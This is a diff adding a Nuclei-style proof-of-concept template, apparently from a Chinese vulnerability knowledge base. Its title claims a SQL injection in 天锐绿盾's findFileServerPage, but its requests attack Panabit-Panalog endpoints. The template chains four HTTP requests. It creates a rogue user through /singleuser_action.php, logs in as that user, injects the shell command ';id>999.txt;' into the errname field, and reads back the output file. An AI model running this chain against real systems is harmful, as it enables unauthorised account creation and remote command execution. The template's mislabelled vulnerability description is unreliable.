@@ -1,0 +1,133 @@
+id: poc-rf56p96x3ivqmfbx
+info:
+  name: 天锐绿盾审批系统findFileServerPage存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rf56p96x3ivqmfbx'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rf56p96x3ivqmfbx
+    fofa: app="Panabit-Panalog"
+http:
+- raw:
+  - 'POST /singleuser_action.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+
+    Content-Length: 576
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+
+    Connection: close
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Dnt: 1
+
+    Upgrade-Insecure-Requests: 1
+
+
+    { "syncInfo": { "user": { "userId": "119", "userName": "119", "employeeId": "119", "departmentId": "119", "departmentName": "119", "coporationId": "119", "corporationName": "119", "userSex": "1", "userDuty": "119", "userBirthday": "119", "userPost": "119", "userPostCode": "119", "userAlias": "119", "userRank": "119", "userPhone": "119", "userHomeAddress": "119", "userMobilePhone": "119", "userMailAddress": "119", "userMSN": "119", "userNt": "119", "userCA": "119", "userPwd": "119", "userClass": "119", "parentId": "119", "bxlx": "119" },"operationType": "ADD_USER" } }
+
+
+    **获取cookie**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /login.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36
+
+    Content-Length: 19
+
+    Accept: application/json, text/javascript, */*; q=0.01
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept-Language: zh-CN,zh;q=0.9
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Priority: u=1, i
+
+    Sec-Ch-Ua: "Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"
+
+    Sec-Ch-Ua-Mobile: ?0
+
+    Sec-Ch-Ua-Platform: "Windows"
+
+    Sec-Fetch-Dest: empty
+
+    Sec-Fetch-Mode: cors
+
+    Sec-Fetch-Site: same-origin
+
+    X-Requested-With: XMLHttpRequest
+
+
+    user=119&mypass=119
+
+
+    **执行id命令**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /App/ajax_app_custom.php HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
+
+    Content-Length: 45
+
+    Accept-Encoding: gzip, deflate, br
+
+    Connection: keep-alive
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Cookie: PHPSESSID=l9sdbnd8ab66titbsakljkfcp2
+
+    action=top&appid=2&errname=;id>999.txt;
+
+
+    **访问结果**'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'GET /App/999.txt HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/119.0
+
+    Accept-Encoding: gzip, deflate, br
+
+    Connection: keep-alive
+
+    Cookie: PHPSESSID=l9sdbnd8ab66titbsakljkfcp2'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
